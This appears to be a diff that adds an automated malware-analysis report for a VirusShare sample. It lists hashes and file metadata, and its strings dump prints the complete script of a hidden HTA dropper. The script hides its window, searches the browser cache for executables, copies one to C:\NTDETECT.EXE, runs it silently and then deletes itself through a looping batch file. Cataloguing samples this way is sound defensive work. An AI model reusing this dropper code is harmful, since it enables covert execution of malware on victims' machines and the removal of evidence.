@@ -1,0 +1,52 @@
+{
+    "docinfo": {},
+    "filename": "VirusShare_761d183367ae092234bc098625d7e560",
+    "filesize": 1592,
+    "filetype": "VAX-order 68K Blit (standalone) executable",
+    "hashes": {
+        "md5": "761d183367ae092234bc098625d7e560",
+        "sha1": "2f115ea029df126de787e98c07f0dd556d435d05",
+        "sha256": "c92c19e1ee8c2d152f9d634e62754b6094f89b3712f479a6608230edc52e996e"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<HTML><BODY><HEAD><SCRIPT language=JScript>window.moveTo(3000,3000);window.resizeTo(0,0);</SCRIPT></HEAD>",
+            "<HTA:APPLICATION ID=RAY BORDER=\"none\" CAPTION=\"no\" SHOWINTASKBAR=\"no\">",
+            "<BODY scroll=\"no\" leftmargin=\"0\" topmargin=\"0\" marginwidth=\"0\" marginheight=\"0\">",
+            "<SCRIPT LANGUAGE=\"JavaScript\">",
+            "function wj(b){",
+            "try{var c=new Enumerator(fso.GetFolder(b).SubFolders);for (;!c.atEnd();c.moveNext()){var f0=c.item().Path+\"\\\\ray[1].exe\";var f1=c.item().Path+\"\\\\ray[2].exe\";",
+            "var f=\"C:\\\\NTDETECT.EXE\";if(fso.FileExists(f0)){fso.CopyFile(f0,f)",
+            "wsh.Run(f,0,false);v=1;}\t\tif(fso.FileExists(f1)){fso.CopyFile(f1,f);wsh.Run(f,0,false);}wj(c.item());}}catch(e){}}",
+            "function kill(){",
+            "path=\"c:\\\\cmd.bat\";",
+            "v=RAY.commandLine;",
+            "v=v.substring(1,v.length-2);",
+            "var _w=fso.CreateTextFile(path);",
+            "_w.Write('@echo off\\r\\n:A\\r\\ndel \"'+v+'\"\\r\\nif exist \"'+v+'\" goto A\\r\\ndel %0');",
+            "_w.close();",
+            "wsh.Run(path,0,false);",
+            "window.close();",
+            "var v=0;",
+            "try{",
+            "var fso=new ActiveXObject(\"Scripting.FileSystemObject\");",
+            "var wsh=new ActiveXObject(\"WScript.Shell\");",
+            "var cache=wsh.RegRead(\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Shell Folders\\\\Cache\");",
+            "}catch(e){}",
+            "function drun(){try{if(v==0){wj(cache);setTimeout(\"drun()\",3000);}else{kill();}}catch(e){}}",
+            "drun();</SCRIPT></BODY></HTML>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.270127",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
